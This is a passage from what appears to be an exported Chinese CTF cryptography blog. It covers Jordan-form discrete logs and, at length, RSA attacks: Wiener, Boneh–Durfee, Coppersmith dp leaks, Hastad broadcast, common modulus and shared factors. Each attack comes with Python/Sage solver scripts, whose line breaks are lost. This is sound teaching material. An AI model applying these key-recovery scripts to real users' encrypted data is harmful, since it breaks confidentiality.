&amp; 0 &amp; 0 \\newline \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\newline 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; \\lambda &amp; 1 \\newline 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; \\lambda \\newline \\end{matrix}\\right)$ 特别地，对于矩阵 $A$ 可对角化的情形，相应的 Jordan 块 $J_1,J_2,\\cdots,J_s$ 均为一阶的。 计算 $(J_n(\\lambda))^k$. 注意到 $J_n(\\lambda)=\\lambda E+J_n(0)$, 应用二项式定理，得到 $(J_n(\\lambda))^k=\\left(\\begin{matrix} \\lambda^k &amp; k\\lambda^{k-1} &amp; \\cdots &amp; \\mathrm{C}_k^{n-1}\\lambda^{k-n+1} \\newline 0 &amp; \\lambda^k &amp; \\cdots &amp; \\mathrm{C}_k^{n-2}\\lambda^{k-n+2} \\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; \\lambda^k \\newline \\end{matrix}\\right)$​ 推导： 对于 $v=A^nu$，求出 $A=PJP^{-1}$，有 $A^n=(PJP^{-1})^n=PJ^nP^{-1}$。 所以 $v=A^nu$ 可以化为 $v’=J^nu’$，其中 $v’=P^{-1}v$ 和 $u’=P^{-1}u$​。 计算 $J^n$ 可借助 WolframAlpha 计算通项公式。 12345678910n = p = A = []B = []G = matrix(GF(p), n, n, A)H = matrix(GF(p), n, n, B)G_Jor, P = G.jordan_form(transformation=True)H_Jor = ~P * H * P 其他： Pohlig–Hellman算法（ $p$ 光滑） discrete_log(H, G,algorithm=&#39;lambda&#39;) 参考： Sharif CTF 8 - ElGamat AIS3 EOF CTF Quals 2021 - notRSA","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"离散对数","slug":"离散对数","permalink":"https://lazzzaro.github.io/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/"}],"author":"Lazzaro"},{"title":"RSA","slug":"crypto-RSA","date":"2020-05-06T14:15:00.000Z","updated":"2025-04-23T13:46:52.510Z","comments":true,"path":"2020/05/06/crypto-RSA/","permalink":"https://lazzzaro.github.io/2020/05/06/crypto-RSA/","excerpt":"","text":"常用工具 分解大素数 factordb （http://www.factordb.com / API: http://factordb.com/api?query=） yafu（$p,q$相差过大或过小yafu可分解成功） sage （divisors(n)）（小素数） Pollard’s p−1 （python -m primefac -vs -m=p-1 xxxxxxx）（光滑数） Williams’s p+1（python -m primefac -vs -m=p+1 xxxxxxx）（光滑数） cado-nfs 在线sage环境：https://sagecell.sagemath.org/ Openssl 解析加密密钥： openssl rsa -pubin -text -modulus -in pub.key 生成解密密钥： python rsatool.py -f PEM -o key.key -p 1 -q 1 -e 1 openssl rsautl -decrypt -inkey key.pem -in flag.enc -out flag openssl rsautl -decrypt -oaep -inkey key.pem -in flag.enc -out flag （OAEP方式） 脚本生成解密密钥： 12345678910111213141516171819202122# coding=utf-8import mathimport sysfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPn = e = d = p = q = rsa_components = (n, e, d, p, q)myrsa = RSA.construct(rsa_components)private = open(&#x27;private.pem&#x27;, &#x27;w&#x27;)private.write(myrsa.exportKey())private.close()# rsakey = RSA.importKey(myrsa.exportKey()) # rsakey = PKCS1_OAEP.new(rsakey)# decrypted = rsakey.decrypt(c_bytes) 脚本集 https://github.com/Ganapati/RsaCtfTool 1234567891011#用法一：已知公钥(自动求私钥) $ python3 RsaCtfTool.py --publickey 公钥文件 --uncipherfile 加密文件 #用法二：已知公钥求私钥 $ python3 RsaCtfTool.py --publickey 公钥文件 --private #用法三：密钥格式转换 #把PEM格式的公钥转换为n，e $ python3 RsaCtfTool.py --dumpkey --key 公钥文件 #把n,e转换为PEM格式 $ python3 RsaCtfTool.py --createpub -n 782837482376192871287312987398172312837182 -e 65537 https://github.com/yifeng-lee/RSA-In-CTF https://github.com/ValarDragon/CTF-Crypto ​ 常见类型给p,q,e,c123456789101112import gmpy2 as gpimport binasciip = q = e = c = n = p*qphi = (p-1)*(q-1)d = gp.invert(e,phi)m = pow(c,d,n)print(m)print(bytes.fromhex(hex(m)[2:])) ​ 给n,e,dp,c$dp\\equiv d \\pmod {(p-1)}$ $\\because dp\\cdot e\\equiv d\\cdot e\\equiv 1 \\pmod {(p-1)}$ $\\therefore dp\\cdot e-1=k\\cdot (p-1)$ $\\therefore (dp\\cdot e-1)\\cdot d\\cdot e=k’\\cdot (p-1),\\quad k’=k\\cdot d\\cdot e \\\\\\Leftrightarrow d\\cdot e=-k’\\cdot (p-1)+dp\\cdot e\\cdot d\\cdot e\\equiv 1 \\pmod{\\varphi(n)}\\\\\\Leftrightarrow -k’\\cdot (p-1)+dp\\cdot e\\equiv 1\\pmod{\\varphi(n)}$ $\\therefore k_{1}\\cdot (p-1)+dp\\cdot e-1=k_{2}\\cdot (p-1)\\cdot (q-1)\\\\\\Leftrightarrow (p-1)\\cdot (k_{2}\\cdot (q-1)-k_{1})+1=dp\\cdot e$ $\\because dp&lt;p-1\\quad \\therefore (k_{2}\\cdot (q-1)-k_{1})\\in (0, e)$ $\\therefore$ 遍历 $(1, e)$，当同时满足 $(dp\\cdot e-1)\\bmod i==0$ 和 $n\\bmod((dp\\cdot e-1)//i+1)==0$ 时，$N$ 成功分解。 12345678910111213141516171819202122import gmpy2 as gpe = n = dp = c = for x in range(1, e): if(e*dp%x==1): p=(e*dp-1)//x+1 if(n%p!=0): continue q=n//p phin=(p-1)*(q-1) d=gp.invert(e, phin) m=gp.powmod(c, d, n) if(len(hex(m)[2:])%2==1): continue print(&#x27;--------------&#x27;) print(m) print(hex(m)[2:]) print(bytes.fromhex(hex(m)[2:])) 变种1：给 $p,e,d_p,c,b$，其中 $n=p^bq$。 Hensel lifting for Takagi’s scheme（p.189）： 1234567891011121314from Crypto.Util.number import *import gmpy2p = dp = c = b = e = mp1 = pow(c, dp, p)mp = pow(c, dp - 1, p)for i in range(1, b - 2): x = pow(c - pow(mp1, e), 1, p**(i + 1)) y = pow(x * mp * (gmpy2.invert(e, p)), 1, p**(i + 1)) mp1 = mp1 + yprint(long_to_bytes(mp1)) 变种2：给 $n,e,dp_0,c,k$，其中 $dp_0$ 为 $dp$ 高 $(n\\text{bits}-k)$ 位，即 $dp_0=dp&gt;&gt;k$。 （Coppersmith攻击，已知dp高位攻击） $e\\cdot dp \\equiv e\\cdot d\\equiv 1 \\pmod {(p-1)} \\\\\\Leftrightarrow e \\cdot dp=k(p-1)+1=kp-k+1 \\\\\\Leftrightarrow e\\cdot dp+k-1 \\equiv 0 \\pmod p$ $\\because dp&lt;p-1$，$\\therefore k&lt;e$ $\\therefore e\\cdot (dp_0&lt;&lt;k+x)+k-1 \\equiv 0 \\pmod p$ 1234567891011121314151617181920212223#Sagedp0 = e = n = F.&lt;x&gt; = PolynomialRing(Zmod(n))d = inverse_mod(e, n)for k in range(1, e): f = (secret &lt;&lt; 200) + x + (k - 1) * d x0 = f.small_roots(X=2 ** (200 + 1), beta=0.44, epsilon=1/32) if len(x0) != 0: dp = x0[0] + (secret &lt;&lt; 200) for i in range(2, e): p = (e * Integer(dp) - 1 + i) // i if n % p == 0: break if p &lt; 0: continue else: print(&#x27;k = &#x27;,k) print(&#x27;p = &#x27;,p) print(&#x27;dp = &#x27;,dp) break 变种3：给 $n,e,dp,c$​​，其中 $dp$​​​ 很小，$e$ 很大。 枚举 $dp$，因 $e\\cdot dp \\equiv 1 \\pmod {(p-1)}$，又由费马小定理，对任意 $r$，有 $m^{e \\cdot dp}\\equiv m \\pmod p$，即 $p \\mid (m^{e \\cdot dp}-m)$； 又 $p \\mid n$，很大概率 $p=\\gcd(m^{e \\cdot dp}-m,n)$。 变种4：给 $N,e,c$，其中 $dp$ 过小。 情形1：$q&lt;N^{0.382}$ 参数 $\\beta=\\cfrac{q_{\\text{bit}}}{N_{\\text{bit}}}, \\delta=\\cfrac{dp_{\\text{bit}}}{N_{\\text{bit}}}$，满足 $3\\beta &lt; 1+\\beta^2+2\\delta$，可确定 $\\beta$ 和 $\\delta$ 的值。 构造格子维度为 $n$，格子中模数 $N$ 的最大次幂为 $m$，应满足关系 $\\cfrac{m(m+1)}{2} + \\cfrac{n(n-1)(2\\delta+\\beta)}{2}-(1-\\beta)nm &lt; 0$ 确定 $\\beta$ 和 $\\delta$ 之后，可枚举确定 $n$ 和 $m$ 的取值（最小值），$m=(1-\\beta)n$ 是一个较优的取值。 12345beta = delta = n = round((1-2*beta-2*delta)/((1-beta)^2-2*delta-beta),6)m = (1-beta)*nprint(m,n) 构造多项式，分解多项式为 $(ax+by)$ 项，其中 $a=k,b=dp$。 12345678910111213141516171819202122232425262728293031323334353637383940# 脚本1# Sagedef getC(Scale): C = [[0 for __ in range(Scale)] for _ in range(Scale)] for i in range(Scale): for j in range(Scale): if i == j or j == 0: C[i][j] = 1 else: C[i][j] = C[i-1][j-1] + C[i-1][j] return Cdef getMatrix(Scale, Mvalue, N, E, Del, Bet): M = [[0 for __ in range(Scale)] for _ in range(Scale)] C = getC(Scale) X, Y = int(pow(N,Del)*(Scale+1)//2), int(pow(N,(Del+Bet))*(Scale+1)//2) for i in range(Scale): for j in range(Scale): M[i][j] = N**max(Mvalue-i,0)*E**(max(i-j,0))*X**(Scale-1-j)*Y**j*C[i][j]*(-1)**j return MN =E =delta = 0.01beta = 0.37Scale = 35Mvalue = 22M = getMatrix(Scale,Mvalue,N,E,delta,beta)M = matrix(ZZ,M)A = M.LLL()[0]p = []X = int(pow(N,delta)*(Scale+1)//2)Y = int(pow(N,(delta+beta))*(Scale+1)//2)for i in range(Scale): p.append(A[i]//(X**(Scale-1-i)*Y**i))PR.&lt;x,y&gt; = PolynomialRing(ZZ)f = 0for i in range(Scale): f += p[i]*x^(Scale-1-i)*y^iprint(f.factor()) 123456789101112131415161718192021222324252627282930313233343536# 脚本2# SageN =e =n = 12beta = 0.36delta = 0.02X = int(N ** delta*(n+1)/2)Y = int(N ** (delta + beta)*(n+1)/2)def C(a,b): ret=1 for i in range(b): ret *= (a-i) ret /= (b-i) return retdef get_Matrix(n,m): MM=[[0 for __ in range(n)] for _ in range(n)] for j in range(n): pN = max(0,m-j) for i in range(j+1): MM[j][i] = pow(N,pN)*pow(X,n-i-1)*pow(Y,i)*pow(e,j-i)*C(j,i)*pow(-1,i) MM = Matrix(ZZ,MM) return MMM = get_Matrix(n,n//2+1)L = M.LLL()[0]x,y = var(&#x27;x&#x27;),var(&#x27;y&#x27;)f = 0for i in range(n): f += x**(n-i-1) * y**i * (L[i] // pow(X,n-i-1) // pow(Y,i))print(f.factor()) 参考： Cryptanalysis of Unbalanced RSA with Small CRT-Exponent https://hash-hash.github.io/2022/05/14/Unbalanced-RSA-with-Small-CRT-Exponent/#An-Approach-Modulo-e NSSCTF Round#3 - Secure_in_N 情形2：$q&lt;N^{0.468}$ 参数 $\\beta=\\cfrac{q_{\\text{bit}}}{N_{\\text{bit}}}, \\delta=\\cfrac{dp_{\\text{bit}}}{N_{\\text{bit}}},\\alpha=\\cfrac{e_{\\text{bit}}}{N_{\\text{bit}}}$， 变量上界 $X=2N^{\\alpha+\\beta+\\delta-1},Y=N^{\\beta},Z=2N^{1-\\beta}$ ，对于变量 $m$ 需充分大。 $\\tau=\\cfrac{(1-\\beta)^2-\\delta}{2\\beta(1-\\beta)},\\sigma=\\cfrac{1-\\beta-\\delta}{2(1-\\beta)},t=\\tau m,s=\\sigma m$ 整数域上有根 $(x,y,z)=(x_0,p,q)$。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117from copy import deepcopy# https://www.iacr.org/archive/pkc2006/39580001/39580001.pdf# Author: ZM__________J, To1inN = e = alpha = log(e, N)beta = delta = P.&lt;x,y,z&gt;=PolynomialRing(ZZ) X = ceil(2 * N^(alpha + beta + delta - 1))Y = ceil(2 * N^beta)Z = ceil(2 * N^(1 - beta)) def f(x,y): return x*(N-y)+Ndef trans(f): my_tuples = f.exponents(as_ETuples=False) g = 0 for my_tuple in my_tuples: exponent = list(my_tuple) mon = x ^ exponent[0] * y ^ exponent[1] * z ^ exponent[2] tmp = f.monomial_coefficient(mon) my_minus = min(exponent[1], exponent[2]) exponent[1] -= my_minus exponent[2] -= my_minus tmp *= N^my_minus tmp *= x ^ exponent[0] * y ^ exponent[1] * z ^ exponent[2] g += tmp return g m = 5 # need to be adjusted according to different situationstau = ((1 - beta)^2 - delta) / (2 * beta * (1 - beta))sigma = (1 - beta - delta) / (2 * (1 - beta)) print(sigma * m)print(tau * m) s = ceil(sigma * m)t = ceil(tau * m)my_polynomials = []for i in range(m+1): for j in range(m-i+1): g_ij = trans(e^(m-i) * x^j * z^s * f(x, y)^i) my_polynomials.append(g_ij) for i in range(m+1): for j in range(1, t+1): h_ij = trans(e^(m-i) * y^j * z^s * f(x, y)^i) my_polynomials.append(h_ij) known_set = set()new_polynomials = []my_monomials = [] # construct partial orderwhile len(my_polynomials) &gt; 0: for i in range(len(my_polynomials)): f = my_polynomials[i] current_monomial_set = set(x^tx * y^ty * z^tz for tx, ty, tz in f.exponents(as_ETuples=False)) delta_set = current_monomial_set - known_set if len(delta_set) == 1: new_monomial = list(delta_set)[0] my_monomials.append(new_monomial) known_set |= current_monomial_set new_polynomials.append(f) my_polynomials.pop(i) break else: raise Exception(&#x27;GG&#x27;) my_polynomials = deepcopy(new_polynomials) nrows = len(my_polynomials)ncols = len(my_monomials)L = [[0 for j in range(ncols)] for i in range(nrows)] for i in range(nrows): g_scale = my_polynomials[i](X * x, Y * y, Z * z) for j in range(ncols): L[i][j] = g_scale.monomial_coefficient(my_monomials[j]) # remove N^jfor i in range(nrows): Lii = L[i][i] N_Power = 1 while (Lii % N == 0): N_Power *= N Lii //= N L[i][i] = Lii for j in range(ncols): if (j != i): L[i][j] = (L[i][j] * inverse_mod(N_Power, e^m)) L = Matrix(ZZ, L)nrows = L.nrows() L = L.LLL()# Recover polyreduced_polynomials = []for i in range(nrows): g_l = 0 for j in range(ncols): g_l += L[i][j] // my_monomials[j](X, Y, Z) * my_monomials[j] reduced_polynomials.append(g_l) # eliminate zmy_ideal_list = [y * z - N] + reduced_polynomials # Varietymy_ideal_list = [Hi.change_ring(QQ) for Hi in my_ideal_list]for i in range(len(my_ideal_list),3,-1): print(i) V = Ideal(my_ideal_list[:i]).variety(ring=ZZ) print(V) 参考： New Attacks on RSA with Small Secret CRT-Exponents NCTF 2022 - dp_promax ​ 给p,q,dp,dq,c$dp=d \\bmod (p-1)$，$dq=d \\bmod (q-1)$ $\\because d=k_{1}(p-1)+dp=k_{2}(q-1)+dq\\\\\\Leftrightarrow k_{1}(p-1)=(dq-dp)+k_{2}(q-1)\\\\\\Leftrightarrow k_{1}\\frac{p-1}{\\gcd(p-1,q-1)}=\\frac{dq-dp}{\\gcd(p-1,q-1)}+k_{2}\\frac{q-1}{\\gcd(p-1,q-1)}\\\\\\Rightarrow k_{1}\\frac{p-1}{\\gcd(p-1,q-1)}\\equiv\\frac{dq-dp}{\\gcd(p-1,q-1)} \\pmod {\\frac{q-1}{\\gcd(p-1,q-1)}}\\\\\\Leftrightarrow k_{1}\\equiv \\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{dq-dp}{\\gcd(p-1,q-1)} \\pmod {\\frac{q-1}{\\gcd(p-1,q-1)}}$ 将 $k_{1}=k_{3}\\frac{q-1}{\\gcd(p-1,q-1)}+\\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{dq-dp}{\\gcd(p-1,q-1)}$ 代入 $d=k_{1}(p-1)+dp$ $d=k_{3}\\frac{(p-1)(q-1)}{\\gcd(p-1,q-1)}+\\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{(dq-dp)(p-1)}{\\gcd(p-1,q-1)}+dp\\\\\\Rightarrow d\\equiv \\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{(dq-dp)(p-1)}{\\gcd(p-1,q-1)}+dp \\pmod{\\frac{(p-1)(q-1)}{\\gcd(p-1,q-1)}}$ 12345678910111213141516171819import gmpy2 as gpp = q = dp = dq = c = n = p*qphin = (p-1)*(q-1)dd = gp.gcd(p-1, q-1)d=(dp-dq)//dd * gp.invert((q-1)//dd, (p-1)//dd) * (q-1) +dqprint(d)m = gp.powmod(c, d, n)print(&#x27;-------------------&#x27;)print(m)print(hex(m)[2:])print(bytes.fromhex(hex(m)[2:])) ​ 给e,d,n计算 $k=ed-1$，选择一个随机数 $g,g \\in (1,N)$。 $k$ 为偶数，故 $k=2^tr$，其中 $r$ 为奇数且 $t \\ge 1$，然后计算 $x = g^{\\frac{k}{2}},g^{\\frac{k}{4}},\\cdots,g^{\\frac{k}{2^t}} \\pmod N$ 直到 $x \\gt 1$ 且 $y=\\gcd(x-1,N) \\gt 1$。 如果这样的 $y$ 存在，则其中的因子 $p=y,q=\\cfrac{N}{y}$；如这样的 $y$ 不存在，则重新生成随机数 $g$。 1234567891011121314151617181920import randomimport gmpy2def divide_pq(e, d, n): k = e*d - 1 while True: g = random.randint(2, n-1) t = k while True: if t % 2 != 0: break t //= 2 x = pow(g, t, n) if x &gt; 1 and gmpy2.gcd(x-1, n) &gt; 1: p = gmpy2.gcd(x-1, n) return (p, n//p) p, q = divide_pq(e, d, n)print(f&#x27;p = &#123;p&#125;&#x27;)print(f&#x27;q = &#123;q&#125;&#x27;) 12345678910111213141516171819202122232425262728import randomimport gmpy2def factor_with_kphi(n, kphi): t = 0 while kphi % 2 == 0: kphi &gt;&gt;= 1 t += 1 for i in range(1, 101): g = random.randint(0, n) y = pow(g, kphi, n) if y == 1 or y == n - 1: continue else: for j in range(1, t): x = pow(y, 2, n) if x == 1: p = gcd(n, y-1) q = n//p return p, q elif x == n - 1: continue y = x x = pow(y, 2, n) if x == 1: p = gcd(n, y-1) q = n//p return p, q ​ 低解密指数攻击/低私钥指数攻击（e长度较大，d小，Wiener Attack）适用情况：已知 $N,e$，且 $e$ 过大或过小。 $\\varphi(n) = (p-1)(q-1)=pq - (p + q) + 1=N - (p + q) + 1$ $\\because p, q$ 非常大，$\\therefore\\,pq\\gg p+q$， $\\therefore\\varphi(n)\\approx N$ $\\because ed\\equiv1\\,mod\\,\\varphi(n)$，$\\therefore ed-1=k\\varphi(n)$，这个式子两边同除 $d\\varphi(n)$ 可得： $\\cfrac{e}{\\varphi(n)}-\\cfrac{k}{d}=\\cfrac{1}{d\\varphi(n)}$ $\\because \\varphi(n)\\approx N$，$\\therefore \\cfrac{e}{N}-\\cfrac{k}{d}=\\cfrac{1}{d\\varphi(n)}$，同样 $d\\varphi(n)$ 是一个很大的数，所以 $\\cfrac{e}{N}$ 略大于 $\\cfrac{k}{d}$ 因为 $e$ 和 $N$ 是知道的，所以计算出 $\\cfrac{e}{N}$ 后，比它略小的 $\\cfrac{k}{d}$ ，可以通过计算 $\\cfrac{e}{N}$ 的连分数展开，依次算出这个分数每一个渐进分数，由于 $\\cfrac{e}{N}$ 略大于 $\\cfrac{k}{d}$，Wiener 证明了，该攻击能精确的覆盖 $\\cfrac{k}{d}$。 在 $e$ 过大或过小的情况下，可使用算法从 $e$ 中快速推断出 $d$ 的值。可以解决 $q&lt;p&lt;2q,d&lt;\\cfrac{1}{3}N^{\\frac{1}{4}}$ 的问题。 RSAWienerHacker工具：https://github.com/pablocelayes/rsa-wiener-attack 12345678910111213141516171819202122232425#脚本1#Sagedef factor_rsa_wiener(N, e): N = Integer(N) e = Integer(e) cf = (e / N).continued_fraction().convergents() for f in cf: k = f.numer() d = f.denom() if k == 0: continue phi_N = ((e * d) - 1) / k b = -(N - phi_N + 1) dis = b ^ 2 - 4 * N if dis.sign() == 1: dis_sqrt = sqrt(dis) p = (-b + dis_sqrt) / 2 q = (-b - dis_sqrt) / 2 if p.is_integer() and q.is_integer() and (p * q) % N == 0: p = p % N q = q % N if p &gt; q: return (p, q) else: return (q, p) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#脚本2#Sagedef rational_to_contfrac(x,y): # Converts a rational x/y fraction into a list of partial quotients [a0, ..., an] a = x // y pquotients = [a] while a * y != x: x, y = y, x - a * y a = x // y pquotients.append(a) return pquotientsdef convergents_from_contfrac(frac): # computes the list of convergents using the list of partial quotients convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0 : i])) return convsdef contfrac_to_rational (frac): # Converts a finite continued fraction [a0, ..., an] to an x/y rational. if len(frac) == 0: return (0,1) num = frac[-1] denom = 1 for _ in range(-2, -len(frac) - 1, -1): num, denom = frac[_] * num + denom, num return (num, denom)n = e = c = def egcd(a, b): if a == 0: return (b, 0, 1) g, x, y = egcd(b % a, a) return (g, y - (b // a) * x, x)def mod_inv(a, m): g, x, _ = egcd(a, m) return (x + m) % mdef isqrt(n): x = n y = (x + 1) // 2 while y &lt; x: x = y y = (x + n // x) // 2 return x def crack_rsa(e, n): frac = rational_to_contfrac(e, n) convergents = convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 # check if x*x - s*x + n = 0 has integer roots D = s * s - 4 * n if D &gt;= 0: sq = isqrt(D) if sq * sq == D and (s + sq) % 2 == 0: return dd = crack_rsa(e, n)m = hex(pow(c, d, n))[2:]print(bytes.fromhex(m)) 12345678910111213141516171819202122232425262728293031#脚本3from Crypto.Util.number import long_to_bytese = n = c = #将分数x/y展开为连分数的形式def transform(x,y): arr=[] while y: arr+=[x//y] x,y=y,x%y return arr #求解渐进分数def sub_fraction(k): x=0 y=1 for i in k[::-1]: x,y=y,x+i*y return (y,x)data=transform(e,n)for x in range(1,len(data)+1): data1=data[:x] d = sub_fraction(data1)[1] m = pow(c,d,n) flag = long_to_bytes(m) if b&#x27;flag&#123;&#x27; in flag: print(flag) break 变种1：$\\cfrac{N_1}{N_2}&lt;\\cfrac{q_1}{q_2}&lt;1$ 参考：2020年羊城杯 - RRRRRRRSA Paper: https://eprint.iacr.org/2015/399.pdf 尝试对 $\\cfrac{N_1}{N_2}$ 进行连分数展开并求其各项渐进分数，记为 $\\cfrac{t_i}{s_i}$ 并验证 $N_1\\% {t_k}==0$ 是否成立，如果成立，那么 $q_1=t_k，q_2=s_k$。 连分数逼近： 123456789101112131415161718192021222324252627282930def transform(x,y): #使用辗转相除将分数x/y转为连分数的形式 res=[] while y: res.append(x//y) x,y=y,x%y return res def continued_fraction(sub_res): numerator,denominator=1,0 for i in sub_res[::-1]: #从sublist的后面往前循环 denominator,numerator=numerator,i*numerator+denominator return denominator,numerator #得到渐进分数的分母和分子，并返回 #求解每个渐进分数def sub_fraction(x,y): res=transform(x,y) res=list(map(continued_fraction,(res[0:i] for i in range(1,len(res))))) #将连分数的结果逐一截取以求渐进分数 return res def wienerAttack(n1,n2): for (q2,q1) in sub_fraction(n1,n2): #用一个for循环来注意试探n1/n2的连续函数的渐进分数，直到找到一个满足条件的渐进分数 if q1==0: #可能会出现连分数的第一个为0的情况，排除 continue if n1%q1==0 and q1!=1: #成立条件 return (q1,q2) print(&quot;该方法不适用&quot;) N1=N2=print(wienerAttack(N1,N2)) 变种2：$Ax \\equiv y \\pmod P$，即 $Ax-kP=y$ 或 $Ax+kP=y$ Wiener’s： $\\Big\\vert \\cfrac{A}{P}-\\cfrac{k}{x}\\Big\\vert \\le \\cfrac{1}{2x^2}$，连分数方法，用 $\\cfrac{A}{P}$ 逼近求出 $\\cfrac{k}{x}$，进而解出 $y$。 Lattice： $(x,k)\\begin{bmatrix}1&amp;A\\\\0&amp;P\\ \\end{bmatrix} = (x,y)$，记为 $vM=w$，$w$ 有很大概率为 $M$ 里的最短向量，使用LLL算法求出最短向量，即解出 $w’=(x,y)$。 参考：Wiener’s v.s Lattices —— Ax≡y(mod P)的方程解法笔记 变种3：$N=p^2q$，$q \\lt p \\lt2q$，$d=N^\\beta$ 可用 $\\cfrac{e}{N-(2N^\\frac{2}{3}-N^\\frac{1}{3})}$ 逼近 $\\cfrac{k}{d}$。 参考：New Attacks on RSA with Modulus N = p^2q Using Continued Fractions ​ 低加密指数广播攻击（Hastad攻击）适用情况： $n,c$ 不同，$m,e$ 相同。一般会是 $e=k$，然后给 $k$ 组数据。 如果一个用户使用同一个加密指数 e 加密了同一个密文，并发送给了其他 e 个用户。那么就会产生广播攻击。这一攻击由 Håstad 提出。 使用不同的模数 $n$，相同的公钥指数 $e$ 加密相同的信息，就会得到多个 $m^e \\equiv c_i \\pmod {n_i}$，将 $m^e$ 视为一个整体 $M$，这就是典型的中国剩余定理适用情况。容易求得 $m^e$ 的值，当 $e$ 较小时直接开 $e$ 方即可，可使用gmpy2.iroot(M,e) 方法。 更一般情况（$k$ 组数据的 $N$ 不同）见15。 123456789#sagedef chinese_remainder(modulus, remainders): Sum = 0 prod = reduce(lambda a, b: a*b, modulus) for m_i, r_i in zip(modulus, remainders): p = prod // m_i Sum += r_i * (inverse_mod(p,m_i)*p) return Sum % prodchinese_remainder([3,5,7],[2,3,2]) #23 12#sagecrt([2,3,2],[3,5,7]) ​ 共模攻击（n,m相同，c,e不同）当$n$不变的情况下，知道$n,e_1,e_2,c_1,c_2$可以在不知道$d_1,d_2$的情况下，解出$m$。 首先假设$e_1,e_2$互质, 即 $\\gcd(e_1,e_2)=1$ 此时则有 $e_1s_1+e_2s_2 = 1$ 式中，$s_1,s_2$皆为整数，但是一正一负。 通过扩展欧几里德算法，我们可以得到该式子的一组解$（s_1,s_2）$，假设$s_1$为正数,$s_2$为负数。 因为 $c_1 = m^{e_1}\\bmod n, c_2 = m^{e_2}\\bmod n$ 所以 $(c_1^{s_1}c_2^{s_2})\\bmod n = ((m^{e_1}\\bmod n)^{s_1}(m^{e_2}\\bmod n)^{s_2})\\bmod n$ 根据模运算性质，可以化简为 $(c_1^{s_1}c_2^{s_2})\\bmod n = ((m^{e_1})^{s_1}(m^{e_2})^{s_2})\\bmod n$ 即 $(c_1^{s_1}c_2^{s_2})\\bmod n = (m^{e_1s_1+e_2s_2})\\bmod n$ 又前面提到 $e_1s_1+e_2s_2 = 1$ 所以 $(c_1^{s_1}c_2^{s_2})\\bmod n = m\\bmod n$ 即 $c_1^{s_1}c_2^{s_2}= m$ 1234567891011121314151617181920212223242526import gmpy2 as gpdef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)n = c1 = c2 = e1 = e2 = s = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = gp.invert(c1, n)elif s2&lt;0: s2 = - s2 c2 = gp.invert(c2, n)m = pow(c1,s1,n)*pow(c2,s2,n) % nprint(hex(m)[2:])print(bytes.fromhex(hex(m)[2:])) ​ e,m相同，多个n中存在两个n有GCD（模不互素）适用情况：存在两个或更多模数 ，且 $\\gcd(n_1,n_2)\\ne 1$ 。 多个模数 $n$ 共用质数，则可以很容易利用欧几里得算法求得他们的质因数之一 $\\gcd(n_1,n_2)$，然后这个最大公约数可用于分解模数分别得到对应的 $p$ 和 $q$，即可进行解密。 1234567891011121314151617181920212223import gmpy2 as gpn=[]for i in n: for j in n: if (i&lt;&gt;j): pub_p=gp.gcdext(i,j) if (pub_p[0]&lt;&gt;1)&amp;(i&gt;j): print(i) print(j) print(pub_p[0]) a=i,p=pub_p[0]q=a//pp =q =e =c =n = p*qphi = (p-1) * (q-1)d = gp.invert(e, phi)m = pow(c, d, n)print(hex(m)[2:])print(bytes.fromhex(hex(m)[2:])) ​ Rabin加密适用情况：$e=2$ 。 一般先通过其他方法分解得到 $p,q$，然后解密。 函数返回四个数，这其中只有一个是我们想要的明文，需要通过其他方式验证。 1234567891011121314151617181920212223import gmpy2def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) // 4, p) mq = pow(c, (q + 1) // 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) c = p = q = m = rabin_decrypt(c,p,q)for i in range(4): try: print(bytes.fromhex(hex(m[i])[2:])) except: pass ​ Boneh and Durfee attack$e$ 非常大接近于$N$，即 $d$ 较小时。与低解密指数攻击类似，比低解密指数攻击（Wiener Attack）更强，可以解决$\\cfrac{1}{3}N^{\\frac{1}{4}} \\leq d \\leq N^{0.292}$的问题。 $\\because ed=k \\varphi +1$ $\\therefore k \\varphi+1 \\equiv 0 \\pmod e \\Rightarrow k(N+1-p-q)+1 \\equiv 0 \\pmod e \\Rightarrow 2k(\\frac{N+1}{2}+\\frac{-p-q}{2}) \\equiv 0 \\pmod e$ 设 $A=\\frac{N+1}{2},y=\\frac{-p-q}{2},x=2k$，有 $f(k,y)=1+x\\cdot(A+y)$ 如果在模 $e$ 下解得该方程的根 $x,y$，由 $ed=1+x\\cdot(A+y)$ 可以得到 $d$。 参考 RSA-and-LLL-attacks。 变种1：$e$ 很大，$dp$ 很小，且 $d&gt;2N^{\\beta}$。 May’s Attack 假设 $e&lt;\\varphi(N),q \\le N^{\\beta},\\beta \\le \\frac{1}{2}$，因 $ed_p \\equiv 1 \\pmod {p-1}$，有 $ed_p=1+k(p-1)$， 对于 $k \\in \\mathbb{N}$，有 